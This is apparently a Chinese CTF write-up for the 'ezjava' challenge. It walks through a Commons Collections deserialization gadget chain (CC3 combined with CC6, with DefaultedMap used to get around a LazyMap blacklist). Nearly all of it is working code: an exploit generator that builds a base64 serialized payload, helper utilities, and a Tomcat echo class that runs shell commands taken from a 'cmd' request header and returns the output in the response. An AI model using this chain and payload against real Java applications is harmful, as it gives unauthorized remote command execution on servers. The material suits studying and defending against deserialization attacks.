# ezjava

就讨论后面的链子吧。看一下调用栈

```xml
newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
<init>:58, TrAXFilter (com.sun.org.apache.xalan.internal.xsltc.trax)
transform:106, InstantiateTransformer (org.apache.commons.collections.functors)  #绕过InvokerTransformer
transform:123, ChainedTransformer (org.apache.commons.collections.functors)
get:187, DefaultedMap (org.apache.commons.collections.map)             #绕过lazymap
getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)
hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)
hash:339, HashMap (java.util)
readObject:1413, HashMap (java.util)
```

这里的没有成功过滤的因为Transformer是一个接口，我们使用的是接口的时候。。使用不会绕过。

```
<regexp>org\.apache\.commons\.collections\.Transformer$</regexp>
```

gadget

```java
package com.firebasky.lvbezjava.exp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import javax.xml.transform.Templates;
import java.io.File;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class exp {
    public static void main(String[] args) throws Exception {
        byte[] bytecodes = Files.readAllBytes(new File("C:\\Users\\dell.FIREBASKY\\Desktop\\lvcbweb\\ezjavacode\\target\\classes\\com\\firebasky\\lvbezjava\\exp\\shell.class").toPath());

        TemplatesImpl obj = new TemplatesImpl();
        Tools.setFieldValue(obj, "_bytecodes",new byte[][]{bytecodes});
        Tools.setFieldValue(obj, "_name", "");
        Tools.setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{obj})
        };
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        //ha1
        //Map hashMap = new HashMap();
        //Map outerMap = DefaultedMap.decorate(hashMap, transformerChain);
        ////触发getValue
        //TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, "key");
        //// 通过hashamp触发
        //HashMap evalMap = new HashMap();
        //evalMap.put(tiedMapEntry, "test");
        //outerMap.remove("key");

        //cc6
        HashMap innermap = new HashMap();
        Map outerMap = DefaultedMap.decorate(innermap, transformerChain);//绕过LazyMap
        TiedMapEntry tiedmap = new TiedMapEntry(outerMap,123);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        Field field = Class.forName("java.util.HashSet").getDeclaredField("map");
        field.setAccessible(true);
        HashMap hashset_map = (HashMap) field.get(hashset);
        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        table.setAccessible(true);
        Object[] array = (Object[])table.get(hashset_map);
        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tiedmap);
        Field field1 =transformerChain.getClass().getDeclaredField("iTransformers");
        field1.setAccessible(true);
        field1.set(transformerChain,transformers);

        System.out.println((Tools.base64Encode(Tools.serialize(hashset))));

    }
}
```

tools 

```java
package com.firebasky.lvbezjava.exp;


import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class Tools {
    public Tools() {
    }
    public static byte[] base64Decode(String base64) {
        Base64.Decoder decoder = Base64.getDecoder();
        return decoder.decode(base64);
    }

    public static String base64Encode(byte[] bytes) {
        Base64.Encoder encoder = Base64.getEncoder();
        return encoder.encodeToString(bytes);
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public static Object deserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}

```

springboot回显evilclass.java

```java
package com.firebasky.lvbezjava.exp;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
/**
 * header cmd=whoami
 */
public class tomcat_v3 extends AbstractTranslet {
    public tomcat_v3() {
        try {
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
            java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler",null);
            contextField.setAccessible(true);
            serviceField.setAccessible(true);
            requestField.setAccessible(true);
            getHandlerMethod.setAccessible(true);
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase =
                    (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();
            for (int i=0;i<connectors.length;i++) {
                if (4==connectors[i].getScheme().length()) {
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    if (protocolHandler instanceof org.apache.coyote.http11.AbstractHttp11Protocol) {
                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();
                        for (int j = 0; j < classes.length; j++) {
                            if (52 == (classes[j].getName().length())||60 == (classes[j].getName().length())) {
                                java.lang.reflect.Field globalField = classes[j].getDeclaredField("global");
                                java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                                globalField.setAccessible(true);
                                processorsField.setAccessible(true);
                                org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(protocolHandler,null));
                                java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                                for (int k = 0; k < list.size(); k++) {
                                    org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(list.get(k));
                                    String cmd =tempRequest.getHeader("cmd");//cmd=whoami
                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
                                    String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                                    java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                                    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                                    String output = s.hasNext() ? s.next() : "";
                                    java.io.Writer writer = request.getResponse().getWriter();
                                    java.lang.reflect.Field usingWriter = request.getResponse().getClass().getDeclaredField("usingWriter");
                                    usingWriter.setAccessible(true);
                                    usingWriter.set(request.getResponse(), Boolean.FALSE);
                                    writer.write(output);//输出
                                    writer.flush();
                                    break;
                                }
                                break;
                            }
                        }
                    }
                    break;
                }
            }
        }catch (Exception e){
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

其实非常熟悉cc的话就是cc3加cc6 就需要绕过lazymap,通过DefaultedMap。。。。。

>参考：
>
>https://ha1c9on.top/2021/09/29/2021-lvcvheng-ezjava/